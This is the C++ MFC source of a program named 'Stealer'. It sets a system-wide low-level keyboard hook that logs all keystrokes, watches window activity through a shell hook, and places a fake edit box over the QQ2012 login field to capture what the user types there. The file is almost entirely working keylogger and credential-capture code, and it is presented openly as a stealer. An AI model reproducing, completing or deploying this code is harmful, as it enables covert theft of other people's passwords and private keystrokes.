// StealerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Stealer.h"
#include "StealerDlg.h"


#define TIMER_ID_SETHOOK		1
#define TIMER_INTERVAL_SETHOOK	50


#ifdef _DEBUG
#define new DEBUG_NEW
#endif



HHOOK	m_hKBLLHook = NULL;
LRESULT CALLBACK MyKeyboardLLHook(int nCode, WPARAM wParam, LPARAM lParam);

LRESULT CALLBACK WindowProcxx( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam );

UINT  msgShellHook = 0;
LONG lpPrevWndProc = 0;

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
END_MESSAGE_MAP()


// CStealerDlg 对话框




CStealerDlg::CStealerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CStealerDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CStealerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_MSG, m_edtMsg);
}

BEGIN_MESSAGE_MAP(CStealerDlg, CDialog)
	ON_WM_SYSCOMMAND()
	//}}AFX_MSG_MAP
	ON_WM_TIMER()
	ON_BN_CLICKED(IDOK, &CStealerDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CStealerDlg 消息处理程序

BOOL CStealerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	//////////////////////////////////////////////////////////////////////////
	g_edtMsg = &m_edtMsg;

	HWND Hwnd = GetSafeHwnd();

	msgShellHook = RegisterWindowMessage(_T("SHELLHOOK"));

	RegisterShellHookWindow( Hwnd );

	lpPrevWndProc = (LONG)SetWindowLong( Hwnd , GWL_WNDPROC, (LONG)WindowProcxx );
	AppendText(_T("初始化成功..."));

	SetTimer(TIMER_ID_SETHOOK,TIMER_INTERVAL_SETHOOK,NULL);
	//////////////////////////////////////////////////////////////////////////

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CStealerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

void CStealerDlg::OnTimer(UINT_PTR nIDEvent)
{
	if ( nIDEvent==TIMER_ID_SETHOOK ){
		RemoveHook();
		AddHook();
	}

	CDialog::OnTimer(nIDEvent);
}

LRESULT CALLBACK MyKeyboardLLHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	CString strText;
	TCHAR lpszKeyName[1024] = {0};
	lpszKeyName[0] = '[';

	if  ((nCode == HC_ACTION) &&       
		((wParam == WM_SYSKEYDOWN) ||  
		(wParam == WM_KEYDOWN)))      
	{
		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
		

		DWORD dwMsg = 1;
		dwMsg += hooked_key.scanCode << 16;
		dwMsg += hooked_key.flags << 24;

 		if ( hooked_key.flags!=0 ){
			//hooked_key.flags不为零，是软件模拟随机发的字符，过滤掉
 			return CallNextHookEx(m_hKBLLHook,nCode,wParam,lParam);
 		}

		int i = GetKeyNameText(dwMsg, (lpszKeyName+1),0xFF) + 1;
		lpszKeyName[i] = ']';

		int key = hooked_key.vkCode;
		if ( key >= 'A' && key <= 'Z' ) {				//默认是大写字母
			int nShift = GetAsyncKeyState(VK_SHIFT);	//<0是按下 >=0没按下
			//int nShift = (GetKeyState(VK_RSHIFT)&1) || (GetKeyState(VK_LSHIFT)&1);
			if( GetKeyState(VK_CAPITAL) & 1) {			//大写打开
				if ( nShift<0 /*nShift*/ ){				//shift按下
					key +=32;							//大写和shift抵消，应该是小写字母						
				}else{									
					//shift没按下大写打开，则就是大写字母
				}
			}else if ( nShift>=0 ){
				key +=32;								//大写和shift都没按下，应该是小写字母				
			}
		}
		strText.Format(_T("flages: %d key = %c\n lpszKeyName = %s\n"), hooked_key.flags, key, lpszKeyName);
		AppendText(strText);
	}

	return CallNextHookEx(m_hKBLLHook,nCode,wParam,lParam);
}


void CStealerDlg::AddHook()
{
	m_hKBLLHook = SetWindowsHookEx(WH_KEYBOARD_LL, MyKeyboardLLHook, GetModuleHandle(NULL), 0);
}

void CStealerDlg::RemoveHook()
{
	if ( m_hKBLLHook!=NULL ) {
		UnhookWindowsHookEx(m_hKBLLHook);
		m_hKBLLHook = NULL;
	}
}

/////////////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK WindowProcxx( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam )
{
	#define HSHELL_APPCOMMAND 12

	CString strText;
	TCHAR szProcessPath[_MAX_PATH] = { 0 };
	DWORD dwProcessId = 0;
	HWND hNewWnd = NULL;

	if( uMsg == msgShellHook ) {

		hNewWnd = (HWND)lParam;
		GetWindowThreadProcessId( hNewWnd ,&dwProcessId);

		switch( wParam ) {
		case HSHELL_WINDOWCREATED:
			{

				if( dwProcessId != GetCurrentProcessId() ) {
					//GetProcessName( dwPid , szProcessPath, _MAX_PATH );
					strText.Format(_T("【窗口创建HSHELL_WINDOWCREATED】pid：%d，hwnd：0x%p，text：%s"),dwProcessId,hNewWnd,getWindowText(hNewWnd));
					AppendText(strText);
				}
			}
			break;

		case HSHELL_APPCOMMAND:
			{
				strText.Format(_T("【窗口创建HSHELL_APPCOMMAND】pid：%d，hwnd：0x%p，text：%s"),dwProcessId,hNewWnd,getWindowText(hNewWnd));
				AppendText(strText);
			}
			break;

		//case HSHELL_REDRAW:
		//case HSHELL_FLASH:
		//	{
		//		str.Format(_T("hwnd:%p,text:%s\n"),hNewWnd,getWindowText(hNewWnd));
		//		OutputDebugString(str);
		//	}
		//	break;

		case HSHELL_REDRAW:
			strText.Format(_T("【窗口重绘HSHELL_REDRAW】pid：%d，hwnd：0x%p，text：%s"),dwProcessId,hNewWnd,getWindowText(hNewWnd));
			AppendText(strText);
			break;
		case HSHELL_GETMINRECT:
			strText.Format(_T("【窗口？？HSHELL_GETMINRECT】pid：%d，hwnd：0x%p，text：%s"),dwProcessId,hNewWnd,getWindowText(hNewWnd));
			AppendText(strText);
			break;
		case HSHELL_WINDOWACTIVATED:
			strText.Format(_T("【窗口激活HSHELL_WINDOWACTIVATED】pid：%d，hwnd：0x%p，text：%s"),dwProcessId,hNewWnd,getWindowText(hNewWnd));
			AppendText(strText);
			//hNewWnd = GetTopWindow(NULL);
			//GetWindowThreadProcessId( hNewWnd ,&dwProcessId);
			//strText.Format(_T("【顶层窗口】pid：%d，hwnd：0x%p，text：%s"),dwProcessId,hNewWnd,getWindowText(hNewWnd));
			//AppendText(strText);
			break;
		case HSHELL_WINDOWDESTROYED:
			strText.Format(_T("【窗口销毁HSHELL_WINDOWDESTROYED】pid：%d，hwnd：0x%p，text：%s"),dwProcessId,hNewWnd,getWindowText(hNewWnd));
			AppendText(strText);
			break;
		default:
			{
				strText.Format(_T("pid:%d,hwnd:%p,text:%s, wParam: %X\n"),dwProcessId,hNewWnd,getWindowText(hNewWnd),wParam);
				AppendText(strText);
			}
			break;
		}
	}
	return CallWindowProc((WNDPROC)lpPrevWndProc, hWnd, uMsg, wParam, lParam);
}
/////////////////////////////////////////////////////////////////////////////////

CString getWindowText(HWND hWnd)
{
	TCHAR szText[MAX_PATH] = {0};
	ULONG_PTR nCchSize = 0;

	if ( SendMessageTimeout(hWnd,WM_GETTEXT,_countof(szText),(LPARAM)szText,SMTO_ABORTIFHUNG|SMTO_NORMAL,1000,&nCchSize)==FALSE ){
		nCchSize = ::GetWindowText(hWnd,szText,_countof(szText));
	}

	return szText;
}	

void FindQQWindow(HWND&hQQMain,HWND&hQQEdit)
{
	HWND hWnd=GetTopWindow(NULL);
	while ( hWnd!=NULL ){
		HWND hChild=FindWindowEx(hWnd,NULL,NULL,NULL);
		if ( hChild==NULL ){
			hWnd=::GetNextWindow(hWnd,GW_HWNDNEXT);
			continue;
		}

		if ( getWindowText(hWnd).Find(_T("QQ2012"))!=-1 ){
			hQQMain = hWnd;
			hQQEdit = hChild;
			break;
		}
		hWnd=::GetNextWindow(hWnd,GW_HWNDNEXT);

	}//end while
}


LONG g_preWindowProcEdit;
LONG g_preWindowProcButton;
HWND g_hQQEdit;

/////////////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK WindowProcEdit( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam )
{
#define HSHELL_APPCOMMAND 12

	LRESULT lResult = 0;
	CString strText;
	TCHAR szProcessPath[_MAX_PATH] = { 0 };
	DWORD dwProcessId = 0;
	HWND hNewWnd = NULL;

	lResult = CallWindowProc((WNDPROC)g_preWindowProcEdit, hWnd, uMsg, wParam, lParam);

	if( uMsg == WM_CHAR ) {
		strText.Format(_T("当前按键key: %d\n"),wParam);
		AppendText(strText);
		AppendText(getWindowText(g_hQQEdit));
	}

	return lResult;
}
/////////////////////////////////////////////////////////////////////////////////

/////////////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK WindowProcButton( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam )
{
#define HSHELL_APPCOMMAND 12

	CString str;
	TCHAR szProcessPath[_MAX_PATH] = { 0 };
	DWORD dwProcessId = 0;
	HWND hNewWnd = NULL;

	if( uMsg == WM_CHAR && wParam==VK_RETURN ) {
		AppendText(getWindowText(g_hQQEdit));
	}
	return CallWindowProc((WNDPROC)g_preWindowProcButton, hWnd, uMsg, wParam, lParam);
}
/////////////////////////////////////////////////////////////////////////////////


void CreateFakeControls()
{
	HWND hQQMain = NULL;
	HWND hQQEdit = NULL;

	WNDCLASSEX WndClsEx;
	HINSTANCE hInstance = GetModuleHandle(NULL);

	FindQQWindow(hQQMain,hQQEdit);

	// Create the application window
	WndClsEx.cbSize        = sizeof(WNDCLASSEX);
	WndClsEx.style         = CS_HREDRAW | CS_VREDRAW;
	WndClsEx.lpfnWndProc   = DefWindowProc;
	WndClsEx.cbClsExtra    = 0;
	WndClsEx.cbWndExtra    = 0;
	WndClsEx.hIcon         = NULL;//LoadIcon(NULL, IDI_APPLICATION);
	WndClsEx.hCursor       = NULL;//LoadCursor(NULL, IDC_ARROW);
	WndClsEx.hbrBackground = NULL;//(HBRUSH)GetStockObject(WHITE_BRUSH);
	WndClsEx.lpszMenuName  = NULL;
	WndClsEx.lpszClassName = _T("BasicApp");
	WndClsEx.hInstance     = hInstance;
	WndClsEx.hIconSm       = NULL;//LoadIcon(NULL, IDI_APPLICATION);

	// Register the application
	RegisterClassEx(&WndClsEx);

	// Create the window object
	HWND hWnd = CreateWindowEx(0,_T("EDIT"),_T(""),WS_CHILD|WS_TABSTOP|WS_CLIPSIBLINGS|0xA0,
		1,0,155,28,hQQEdit,NULL,hInstance,NULL);
	//SetParent(hWnd,hQQEdit);
	g_hQQEdit = hWnd;
	ShowWindow(hWnd,SW_SHOW);
	g_preWindowProcEdit = (LONG)SetWindowLong( hWnd , GWL_WNDPROC, (LONG)WindowProcEdit );

	///////////////////////// 

	//hWnd = CreateWindowEx(0,_T("BasicApp"),_T(""),WS_CHILD|WS_CLIPSIBLINGS,
	//	0,0,93,23,hQQMain,NULL,hInstance,NULL);
	////SetParent(hWnd,hQQMain);
	//ShowWindow(hWnd,SW_SHOW);
	//g_preWindowProcButton = (LONG)SetWindowLong( hWnd , GWL_WNDPROC, (LONG)WindowProcButton );
}



void CStealerDlg::OnBnClickedOk()
{
	CreateFakeControls();
}

CEdit *g_edtMsg = NULL;
void AppendText(const CString&strText)
{
	if ( g_edtMsg ){
		int nLine=g_edtMsg->GetLineCount();
		if ( nLine>2000 ){
			g_edtMsg->Clear();
		}
		LONG nLen=(LONG)g_edtMsg->SendMessage(WM_GETTEXTLENGTH);
		g_edtMsg->SetSel(nLen,-1);
		g_edtMsg->ReplaceSel(strText+_T("\r\n"));
	}
}
